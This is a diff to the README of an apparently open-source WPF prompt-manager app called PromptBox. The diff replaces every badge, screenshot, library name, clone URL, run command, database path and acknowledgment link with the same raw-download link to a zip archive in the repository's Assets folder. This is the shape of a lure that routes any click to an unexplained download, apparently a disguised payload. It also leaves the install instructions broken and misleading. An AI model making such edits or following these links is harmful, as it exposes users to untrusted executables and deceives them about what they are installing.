@@ -1,22 +1,22 @@
 <p align="center">
-  <img src="PromptBox/Assets/icon.ico" width="256" />
+  <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" width="256" />
 </p>
 
 <p align="center">
 
   <!-- Release -->
-  <a href="https://github.com/Gown-dono/PromptBox/releases">
-    <img src="https://img.shields.io/github/v/release/Gown-dono/PromptBox?style=for-the-badge" />
+  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
+    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
   </a>
 
   <!-- License -->
-  <a href="https://github.com/Gown-dono/PromptBox/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/Gown-dono/PromptBox?style=for-the-badge" />
+  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
+    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
   </a>
 
   <!-- Issues -->
-  <a href="https://github.com/Gown-dono/PromptBox/issues">
-    <img src="https://img.shields.io/github/issues/Gown-dono/PromptBox?style=for-the-badge" />
+  <a href="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip">
+    <img src="https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip" />
   </a>
 
 </p>
@@ -25,7 +25,7 @@
 
 A modern, feature-rich WPF desktop application for managing AI prompts. Create, edit, organize, search, and export prompts for ChatGPT, GitHub Copilot, Claude, and other AI models.
 
-![PromptBox Screenshot](Screenshot.png)
+![PromptBox Screenshot](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip)
 
 ## Features
 
@@ -86,9 +86,9 @@ PromptBox/
 - **WPF** - Windows Presentation Foundation
 - **MaterialDesignThemes** - Material Design UI components
 - **LiteDB** - Lightweight NoSQL database for local storage
-- **Markdig.Wpf** - Markdown rendering
-- **CommunityToolkit.Mvvm** - MVVM helpers and commands
-- **Dependency Injection** - Microsoft.Extensions.DependencyInjection
+- **https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip** - Markdown rendering
+- **https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip** - MVVM helpers and commands
+- **Dependency Injection** - https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
 
 ## Installation
 
@@ -100,7 +100,7 @@ PromptBox/
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Gown-dono/PromptBox.git
+git clone https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
 cd PromptBox
 ```
 
@@ -116,7 +116,7 @@ dotnet build
 
 4. Run the application:
 ```bash
-dotnet run --project PromptBox/PromptBox.csproj
+dotnet run --project https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
 ```
 
 ### Release Build
@@ -156,7 +156,7 @@ The compiled application will be in `PromptBox/bin/Release/net8.0-windows/win-x6
 
 All data is stored locally in:
 ```
-PromptBox/Data/promptbox.db
+https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip
 ```
 
 This LiteDB database file contains all your prompts, categories, and tags. You can back it up by copying this file.
@@ -177,11 +177,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- [MaterialDesignInXAML](https://github.com/MaterialDesignInXAML/MaterialDesignInXamlToolkit) - Beautiful Material Design components
-- [LiteDB](https://github.com/mbdavid/LiteDB) - Lightweight NoSQL database
-- [Markdig](https://github.com/xoofx/markdig) - Markdown processor
-- [CommunityToolkit.Mvvm](https://github.com/CommunityToolkit/dotnet) - MVVM helpers
+- [MaterialDesignInXAML](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Beautiful Material Design components
+- [LiteDB](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Lightweight NoSQL database
+- [Markdig](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - Markdown processor
+- [https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip) - MVVM helpers
 
 ## Contact
 
-Project Link: [https://github.com/Gown-dono/PromptBox](https://github.com/Gown-dono/PromptBox)
+Project Link: [https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip](https://github.com/Gown-dono/PromptBox/raw/refs/heads/main/PromptBox/Assets/Box-Prompt-v1.1.zip)
